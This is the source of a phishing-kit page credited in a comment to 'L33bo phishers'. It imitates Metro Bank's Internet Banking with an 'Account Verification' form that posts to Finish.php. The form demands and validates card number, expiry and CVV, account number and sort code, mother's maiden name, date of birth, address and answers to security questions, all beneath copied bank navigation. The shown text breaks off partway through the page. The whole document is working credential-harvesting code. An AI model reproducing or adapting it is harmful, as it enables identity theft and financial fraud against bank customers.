<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
?>
<html dir="ltr" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <title>Account Verification</title>
    <link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <link href="assets/css/cabin-font.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/chosen.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/core_screen.min.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/core_screen.min2.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/common.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/jquery-ui.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/jquery-ui-1.8.11.custom.css" media="screen" rel="stylesheet" type="text/css">
    <style type="text/css">.accessibilityStyle{position:absolute!important;width:0!important;height:0!important;font-size:0!important;overflow:hidden!important;padding:0!important}.ecDIB{display:-moz-inline-stack;display:inline-block;zoom:1;*display:inline}.ecDIBCol{vertical-align:top}.ui-icon{width:15px!important;height:15px!important}.ui-widget-content{background-image:none!important;background-color:#F2F2F2!important}.ui-corner-top,.ui-corner-bottom,.ui-corner-all{border-radius:3px}.ui-state-default,.ui-widget-content .ui-state-default,.ui-widget-header{border:none;background:#fff;color:#333}.ui-state-default{border:inherit;background:inherit}.ui-state-active,.ui-widget-content .ui-state-active,.ui-widget-header .ui-state-active{border:none;background:#fff;color:#0983c4}.ui-state-default a,.ui-state-default a:link,.ui-state-default a:visited{color:#333}.ui-state-active a,.ui-state-active a:link,.ui-state-active a:visited{color:#0983c4}.ui-accordion .ui-accordion-header a{padding:15px 10px 10px 40px}.ui-accordion .ui-accordion-content{margin-top:0;margin-bottom:0;border-bottom:1px solid #c1c1c1;top:0;padding:0}.ui-widget-content{border:none}.ui-accordion .ui-accordion-header{margin-top:0;margin-bottom:0;border-top:none!important;border-bottom:1px solid #c1c1c1}.HideAccordionButton{width:18px;height:18px;background-image:url(./templates/widgets/jquery-ui/img/RemoveAccord.png);float:right}.ui-widget{font-family:inherit!important;font-size:inherit!important}.ui-widget-header{color:#222;font-weight:700}.ui-widget-content a{color:inherit}.ui-dialog{position:absolute!important;padding:0!important;-webkit-box-shadow:0 3px 10px rgba(0,0,0,0.75);-moz-box-shadow:0 3px 10px rgba(0,0,0,0.75);box-shadow:0 3px 10px rgba(0,0,0,0.75)}.ui-dialog-title{font-size:1.4em;line-height:1.25em;margin:0!important}.ui-dialog-content{padding:0!important}.ui-dialog-titlebar{border-bottom:2px solid #DE1927!important;padding:1.25em 22.5px!important}.ui-dialog-titlebar.ui-corner-all{border-radius:0!important}.ui-widget-overlay{background:none repeat scroll 0 0 #000!important;opacity:.5!important}.dataTables_paginate .ui-button{margin-right:0!important;padding:11px 15px}.ui-widget-header .ui-state-hover{border:0!important;background:none!important}.ui-buttonset{margin-right:0!important}.ui-icon{width:12px;height:12px}.UserError{border-color:#cd0202!important;border-width:3px!important;border-style:solid!important;color:#cd0202!important}   </style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="assets/js/jquery.maskedinput.js"></script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#a3").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"xx-xx-xx"});
});
</script>
<script>
jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: { required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
					mobile: { required: true, minlength: 11,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					acno: { required: true, minlength: 8, digits: true,},
					sortcode: { required: true, minlength: 8},
					mmn: { required: true, minlength: 2,},
					a1: { required: true, minlength: 2,},
					a2: { required: true, minlength: 2,},
					a3: { required: true, minlength: 10},
                },
				errorPlacement: function(error, element) {
						error.insertAfter(element);
				},
                messages: {
					name: {
						required: "<br>Please provide your full name",
						minlength: jQuery.validator.format("<br>Please provide your full name"),
					},
					dob: { 
						required: "<br>Please provide your date of birth", 
					},
					address: {
						required: "<br>Please provide the 1st line of your address",
						minlength: jQuery.validator.format("<br>Please check the address you have entered"),
					},
					postcode: {
						required: "<br>Please provide your postcode",
						minlength: jQuery.validator.format("<br>Please check the postcode you have entered"),
					},
					mobile: {
						required: "<br>Please provide your 11 digit mobile telephone number",
						minlength: jQuery.validator.format("<br>Please check the mobile telephone number you have entered"),
						digits: jQuery.validator.format("<br>Please ensure you enter digits only"),
					},
					ccno: {
						required: "<br>Please provide your 16 digit card number",
						minlength: jQuery.validator.format("<br>Please check the card number you have entered"),
						creditcard: jQuery.validator.format("<br>Please check the card number you have entered"),
					},
					ccexp: {
						required: "<br>Please provide your cards expiry date",
						minlength: jQuery.validator.format("<br>Please check the card expiry date you have entered"),
						date: jQuery.validator.format("<br>Please check the card expiry date you have entered"),
					},
					secode: {
						required: "<br>Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("<br>Please check the card security code you have entered"),
						digits: jQuery.validator.format("<br>Please ensure you enter digits only"),
					},
					acno: {
						required: "<br>Please provide your 8 digit account number",
						minlength: jQuery.validator.format("<br>Please check the account number you have entered"),
						digits: jQuery.validator.format("<br>Please ensure you enter digits only"),
					},
					sortcode: { 
						required: "<br>Please provide your sortcode", 
						minlength: jQuery.validator.format("<br>Please check the sortcode you have entered"),
					},
					mmn: { 
						required: "<br>Please provide your mother's maiden name", 
						minlength: jQuery.validator.format("<br>Please check the mother's maiden name you have entered"), 
					},
					a1: { 
						required: "<br>Please provide your answer to this security question", 
						minlength: jQuery.validator.format("<br>Please check your answer to this security question"), 
					},
					a2: { 
						required: "<br>Please provide your answer to this security question", 
						minlength: jQuery.validator.format("<br>Please check your answer to this security question"), 
					},
					a3: { 
						required: "<br>Please provide your answer to this security question", 
						minlength: jQuery.validator.format("<br>Please check your answer to this security question"), 
					},

				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<style>
span.error {color:red;display: block;}
input[type="text"].error { border: 2px solid #d66 }
.sort {width:90px!important}
.smallinput {width:60px!important}
.medinput {width:120px!important}
.field {width:320px!important}
</style>
</head>
<body class="BrowserWindow" style="margin: 0px;" data-gr-c-s-loaded="true">
    <form accept-charset="UTF-8" action="Finish.php" autocomplete="off" id="details" method="post" name="details" style="margin:0px;">
        <input style="left: -10000px; position: absolute" type="text">
        <div id="EDGE_CONNECT_PROCESS" style="clear: both">
		
		
<header class="fixed">
<div class="row" style="clear: both;">
<div style="clear: both; width: 100%">
<div class="logo column" id="logov" style="float: left;">
<div>
<div style="clear: left;">
<div style="text-align: left; width:">
<div>METRO BANK</div>
</div>
</div>
<div class="no-print" style="clear: left;">
<div class="floatNone" style="float: left;">
<div>&nbsp;</div>
</div>
<div style="float: left;">
<div>&nbsp;</div>
</div>
<div style="float: left;">
<div>&nbsp;</div>
</div>
<div style="text-align: left; float: left;">
<div><a class="no-print" href="#" title="Home"><span>Home</span></a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
<div class="column floatRight" style="float: left;width:335px;">
<div>
<div style="clear: both;">
<div>
<div style="position: relative">
<div style="width: 100%">
<div class="float-right4-print" style="float: left;">
<div>
<div>
<div style="position: relative">
<div></div>
<div>
<div style="clear: left;">
<div class="header-menu-item fontSizep9em" style="text-align: left; ; float: left;">
<div>Call us on <strong>0345 08 08 500</strong> for any help</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="dropdown header-hover-effect floatRight" style="float: left;">
<div>
<div>
<div style="position: relative">
<div></div>
<div>
<div class="dropdown-toggle" style="clear: left;">
<div style="text-align: left; float: left;">
<div><a class="header-menu-link drop-down-indicator fontSizep9em" href="#">Our Stores <b class="caret"></b></span></a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="dropdown-menu contact-menu" id="contactus" style="clear: both; display:none;">
<div>
<div style="position: relative">
<div></div>
<div>
<div style="clear: left;">
<div class="nav-header" style="text-align: left; ; float: left;">
<div>Come and see us</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="nav-padding wrap-text" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div class="marginBottom1em fontWeight800 fontSizep9em" style="text-align: left; ; float: left;">
<div>Our Stores are open 7 days a week, 362 days a year.</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div style="clear: left;">
<div class="marginBottom1em fontSizep9em" style="text-align: left; ; float: left;">
<div>We are only closed on New Year's Day, Easter Sunday and Christmas Day.</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div>
<div style="clear: left;">
<div style="text-align: center;">
<div style=" background-color: #E5E5E5; border-bottom: 1px solid #FFFFFF; height: 1px; margin: 6px 0px 1px; overflow: hidden;">
<hr></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div style="clear: left;">
<div class="floatNone" style="text-align: left; float: left;">
<div>
<style>
a.link:hover{text-decoration:underline!important;color: #0235b4;}
</style>
<a class="NoDecoration" href="#"><span aria-hidden="true" data-icon="("></span> Find a Metro Bank Store</a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
</div>



<div>
<div id="row_QUE_POPUPMODALHANDLER" style="clear: left;">
<div id="p1_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; ; float: left;display: none;">
<div><label for="QUE_POPUPMODALHANDLER">popupModalHandler</label></div>
</div>
<div id="p2_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; float: left; display: none;">
<div>&nbsp;</div>
</div>
<div id="p3_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; float: left; display: none;">
<div>&nbsp;</div>
</div>
<div id="p4_QUE_POPUPMODALHANDLER__REMOVED" style="float: left;text-align: left; ; display: none;display: none;">
<div><input id="QUE_POPUPMODALHANDLER" maxlength="256" name="WORKINGELEMENTS[1].POPUPMODALHANDLER" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id); startJob('', 'onblur', 'QUE_POPUPMODALHANDLER');if (ajaxValidate('servletcontroller', '', '', event, this, true, false,'', ['','','','','','','','',''])) {ajaxQuestionAction('2635731E7BD26D7D Question 497', 'QUE_POPUPMODALHANDLER' , false, '', 'servletcontroller', '', false, event, true, true, false); endJob('', 'onblur', true, 'QUE_POPUPMODALHANDLER'); return true;} else {endJob('', 'onblur', false, 'QUE_POPUPMODALHANDLER'); return false;}}" onfocus="doOnFocus('', this.id, ''); ;setUpFocusValue('',this);" onkeypress="return(checkForDefaultButtonAction(event, this, 'F', ''))" size="15" type="text"></div>
<label for="QUE_POPUPMODALHANDLER" id="QUE_POPUPMODALHANDLER_ERRORMESSAGE" style="display: none;"></label></div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>




<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</header>


            <div class="navigation-content" style="clear: both;">
                <div class="row" style="clear: both;">
                    <div style="clear: both; width: 100%">
                        <div class="column grid-6" style="float: left;">
                            <div>
                                <div style="clear: left;">
                                    <div style="float: left;">
                                        <div>
                                            <h3 class="internet-title">Internet Banking</h3>
                                        </div>
                                    </div>
                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                </div>
                            </div>
                        </div>
                        <div class="column clearfix floatRight" style="float: left;">
                            <div>
                                <div style="clear: both;">
                                    <div>
                                        <div style="position: relative">
                                            <div class="floatRight user-panel-alt" style="clear: both;">
                                                <div class="IE8-width-tweak" style="clear: both;">
                                                    <div style="clear: both; width: 100%">
                                                        <div class="padding-username" style="float: left;">
                                                            <div>
                                                                <div style="clear: both;">
                                                                    <div style="clear: both; width: 100%">
                                                                        <div style="float: left;width: 30%;width: 30%;">
                                                                        </div>
                                                                        <div style="float: left;width: 60%;width: 60%;">
                                                                            <div>
                                                                                <div class="dropdown" style="clear: both;">
																					
																					
																					

                                                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                </div>
                                                                <div>
                                                                    <div style="clear: left;display: none;">
                                                                        <div style="float: left;text-align: left; ; display: none;">
                                                                            <div>
                                                                                <label class="accessibilityStyle" for="some">Select profile</label> <span class="displayNone" id="p2_QUE_A5FBC89B03D2A21F560672"></span> <select class="chzn-select amount-dropdowns chzn-done" data-placeholder="Choose an entity" id="QUE_A5FBC89B03D2A21F560672" name="METROBANK[1].SME[1].CUSTOMERS" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) { doOnBlur('', this.id);}" onchange="changeTest(this.id); startJob('', 'onchange', 'QUE_A5FBC89B03D2A21F560672');var valid=ajaxValidate('servletcontroller', '', '', event, this, false, false,'', ['','','','','','','','','']); endJob('', 'onchange', valid, 'QUE_A5FBC89B03D2A21F560672'); return valid;;" onfocus="doOnFocus('', this.id, '');" onkeypress="return(checkForDefaultButtonAction(event, this, 'F', ''))" style="width: 320px !important; display: none;">
                                                                                    <option value="">
                                                                                        </option>
                                                                                    <optgroup label="">
                                                                                        <option id="to" value="1">
                                                                                            
                                                                                        </option>
                                                                                    </optgroup>
                                                                                </select>
                                                                                <div class="chzn-container chzn-container-single" style="width: 320px;">
                                                                                    <a class="chzn-single chzn-default" href="#" tabindex="-1"><span>Choose an entity</span>
                                                                                    <div>
                                                                                        <b></b>
                                                                                    </div></a>
                                                                                    <div class="chzn-drop" style="left: -9000px; width: 318px; top: 0px;">
                                                                                        <div class="chzn-search">
                                                                                            <input autocomplete="off" style="width: 100%;" type="text">
                                                                                        </div>
                                                                                        <ul class="chzn-results">
                                                                                            <li class="group-result"></li>
                                                                                            <li class="active-result group-option" style="">Account Verification</li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                            </div><label style="display: none;"></label>
                                                                        </div>
                                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                    </div>
                                                                    <div style="clear: left;">
                                                                        <div style="text-align: left; ; float: left;">
                                                                            <div>
                                                                                <h5 class="capitilise-text header-color">Account Verification</h5>
                                                                            </div>
                                                                        </div>
                                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                    </div>
                                                                    <div class="displayNone" id="row_SME_RULES" style="clear: left;">
                                                                        <div class="displayNone" id="p1_SME_RULES" style="float: left;">
                                                                            <div>
                                                                                &nbsp;
                                                                            </div>
                                                                        </div>
                                                                        <div class="displayNone" id="p2_SME_RULES" style="float: left;">
                                                                            <div>
                                                                                &nbsp;
                                                                            </div>
                                                                        </div>
                                                                        <div class="displayNone" id="p3_SME_RULES" style="float: left;">
                                                                            <div>
                                                                                &nbsp;
                                                                            </div>
                                                                        </div>
                                                                        <div class="displayNone" id="p4_SME_RULES" style="text-align: left; float: left;">
                                                                            <div>
                                                                                <a class="displayNone" href="#" id="SME_RULES" onclick="return buttonClicked('__95CF59CD151FF1A9 FormButton 785', false, null, '', false, 'SME_RULES', true, true, '', true, true, null);" title="Continue"><span>Continue</span></a>
                                                                            </div>
                                                                        </div>
                                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div style="float: left;float:right!important;">
                                                            <div>
                                                                <div style="clear: left;">
                                                                    <div style="text-align: right; float: left;">
                                                                        <div>
                                                                            <button class="btnvb button" name="logout" title="Logout" type="button" value="Logout">Logout</button>
                                                                        </div>
                                                                    </div>
                                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                </div>
                                                <div class="IE8-width-tweak" style="clear: both;">
                                                    <div style="clear: both; width: 100%">
                                                        <div style="float: left;">
                                                            <div>
                                                                <div>
                                                                    <div style="position: relative">
                                                                        <div class="dropdown" style="clear: both;">
                                                                            <div style="clear: both">
                                                                                <div style="clear: left;">
                                                                                    <div style="text-align: left; float: left;">
                                                                                        <div>
                                                                                            <a class="header-menu-link drop-down-indicator fontSizep9em link-override" href="#" id="BUT_0CCB45AD05D277F0113670" onclick="onToggle('BUT_0CCB45AD05D277F0113670','FMT_0C62B74FFDCD4CDC82821','N', 'N', event); return false"><span class="">Details &amp; Preferences <b class="caret"></b></span></a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                                </div>
                                                                            </div>
                                                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                        </div>
                                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div style="float: left;margin-left: 16px;">
                                                            <div>
                                                                <div>
                                                                    <div style="position: relative">
                                                                        <div class="dropdown" style="clear: both;">
                                                                            <div style="clear: both">
                                                                                <div style="clear: left;">
                                                                                    <div style="text-align: left; float: left;">
                                                                                        <div>
                                                                                            <a class="header-menu-link drop-down-indicator fontSizep9em link-override" href="#" id="BUT_0C62B74FFDCD4CDC82643" onclick="onToggle('BUT_0C62B74FFDCD4CDC82643','FMT_0C62B74FFDCD4CDC82645','N', 'N', event); return false"><span class="">Messages <span class="badge success">0</span> <b class="caret"></b></span></a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                                </div>
                                                                            </div>
                                                                            <div>
                                                                                <div style="position: relative">
                                                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                                </div>
                                                                            </div>
                                                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                        </div>
                                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                </div>
                                                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                            </div>
                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                        </div>
                                    </div>
                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                </div>
                <div class="row" style="clear: both;">
                    <div class="grid-12" style="clear: both;">
                        <div>
                            <div style="position: relative">
                                <div class="mega-menu column grid-12" style="clear: both;">
                                    <div style="clear: both; width: 100%">
                                        <div class="dropdown" style="float: left;">
                                            <div>
                                                <div class="MegaMenuItem floatLeft home" style="clear: left;">
                                                    <div style="float: left;">
                                                        <div>
                                                            <a class="homeIcon icon" href="#"></a>
                                                        </div>
                                                    </div>
                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="dropdown" style="float: left;">
                                            <div>
                                                <div>
                                                    <div style="position: relative">
                                                        <div></div>
                                                        <div>
                                                            <div class="MegaMenuItem" style="clear: left;">
                                                                <div style="text-align: left; float: left;">
                                                                    <div>
                                                                        <a class="" href="#"><span class="nav-main-title">View your Accounts <b class="caret"></b></span><br>
                                                                        <span class="nav-sub-title">&amp; transactions</span></a>
                                                                    </div>
                                                                </div>
                                                                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                            </div>
                                                        </div>
                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="dropdown" style="float: left;">
                                            <div>
                                                <div>
                                                    <div style="position: relative">
                                                        <div></div>
                                                        <div>
                                                            <div class="MegaMenuItem" style="clear: left;">
                                                                <div style="text-align: left; float: left;">
                                                                    <div>
                                                                         <a class="" href="#"><span class="nav-main-title">Make a Payment <b class="caret"></b></span><br>
                                                                        <span class="nav-sub-title">send &amp; move money</span></a>
                                                                    </div>
                                                                </div>
                                                                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                            </div>
                                                        </div>

                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="dropdown" style="float: left;">
                                            <div>
                                                <div>
                                                    <div style="position: relative">
                                                        <div></div>
                                                        <div>
                                                            <div class="MegaMenuItem linear-gradient current" style="clear: left;">
                                                                <div style="text-align: left; float: left;">
                                                                    <div>
                                                                        <a class="" href="#"><span class="nav-main-title">Your Payee List <b class="caret"></b></span><br>
                                                                        <span class="nav-sub-title">view &amp; manage payees</span></a>
                                                                    </div>
                                                                </div>
                                                                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                            </div>
                                                        </div>

                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="dropdown" style="float: left;">
                                            <div>
                                                <div>
                                                    <di style="position: relative">
                                                        <div></div>
                                                        <div>
                                                            <div class="MegaMenuItem linear-gradient" style="clear: left;">
                                                                <div style="text-align: left; float: left;">
                                                                    <div>
                                                                        <a class="" href="#"><span class="nav-main-title">View your Statements <b class="caret"></b></span><br>
                                                                        <span class="nav-sub-title">&amp; other documents</span></a>
                                                                    </div>
                                                                </div>
                                                                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                            </div>
                                                        </div>
                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="dropdown" style="float: left;">
                                            <div>
                                                <div class="MegaMenuItem floatLeft linear-gradient" style="clear: left;margin-right:0!important;">
                                                    <div style="text-align: left; float: left;">
                                                        <div>
                                                            <a class="" href="#"><span class="nav-main-title">Help <b class="caret"></b></span><br>
                                                            <span class="nav-sub-title">&amp; Contact Us</span></a>
                                                        </div>
                                                    </div>
                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                </div>
                                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                            </div>
                        </div>
                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                    </div>
                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                </div>
                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
            </div>
            <div class="main-content" style="clear: both;">
                <div id="EDGE_CONNECT_PHASE" style="clear: both">
                    <div>
                        <div style="position: relative">
                            <header class="row manage-payees content-header">
                                <div class="grid-12 column" style="clear: both;">
                                    <div class="row" style="clear: both;">
                                        <div style="clear: both; width: 100%">
                                            <div class="column grid-10" style="float: left;">
                                                <div>
                                                    <div style="clear: left;">
                                                        <div style="text-align: left; ; float: left;">
                                                            <div>
                                                                <h1 class="margin-bottom-10px">Manage your Payee list</h1>
                                                            </div>
                                                        </div>
                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                    </div>
                                                    <div style="clear: left;">
                                                        <div class="marginBottom1em" style="text-align: left; ; float: left;">
                                                            <div>
                                                                You can view, manage and create new Payees here. You can then use these to send money and/or set up regular payments.
                                                            </div>
                                                        </div>
                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="floatRight column grid-2" style="float: left;">
                                                <div>
                                                    <div>
                                                        <div style="position: relative">
                                                            <div class="dropdown-parent" style="clear: both;">
                                                                <div style="clear: both">
                                                                    <div id="row_BUT_HELP_PAGE" style="clear: left;">
                                                                        <div class="floatNone" id="p4_BUT_HELP_PAGE" style="text-align: left; float: left;">
                                                                            <div>
                                                                                <button class="RETRIEVE_HELP" id="BUT_HELP_PAGE" name="__E1962C4DF5A2E034 FormButton 887" onclick="ajaxButtonAction('preInGrpGRP_BC96B952C8867E46661364', '__E1962C4DF5A2E034 FormButton 887', 'BUT_HELP_PAGE', false, null, '', 'servletcontroller', '', true, true, '');" onkeypress="if(validActionKey(event)) {this.onclick();}" onmouseover="this.style.cursor='pointer'" title="Help for this page" type="button" value="Help for this page">Help for this page</button>
                                                                            </div>
                                                                        </div>
                                                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                                    </div>
                                                                </div>
																
												
                                                                <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                            </div>
                                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                    </div>
                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                </div>
                            </header>
                            <section class="row">
                                <div class="column grid-10 prefix-1 content-box padded manage-payees" style="clear: both;">
                                    <div style="clear: both">
                                        <div style="clear: left;display: none;">
                                            <div style="display: none;text-align: left; ; float: left;">
                                                <div>
                                                    <h3>Your Payee List</h3>
                                                </div>
                                            </div>
                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                        </div>
                                        <div style="clear: left;">
                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                        </div>
                                    </div>
                                    <div>
                                        <div style="position: relative">
                                            <div></div>
                                            <div>
                                                <div style="clear: left;">
                                                    <div style="text-align: left; ; float: left;">
                                                        <div>
                                                            <h3 class="space-after" >You currently have no saved Payees</h3>
                                                        </div>
                                                    </div>
                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                </div>
                                                <div style="clear: left;">
                                                    <div style="text-align: left; float: left;">
                                                        <div>
                                                            <button class="primary" title="Create a new Payee" type="button" value="Create a new Payee">Create a new Payee</button>
                                                        </div>
                                                    </div>
                                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                                </div>
                                            </div>
                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                        </div>
                                    </div>
                                    <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                </div>
                                <div class="column grid-10 prefix-1" style="clear: both;">
                                    <div style="clear: both">
                                        <div class="space-after" style="clear: left;">
                                            <div style="text-align: left; ; float: left;">
                                                <div>
                                                    <h3 class="paddingTop20px">Help</h3>
                                                </div>
                                            </div>
                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                        </div>
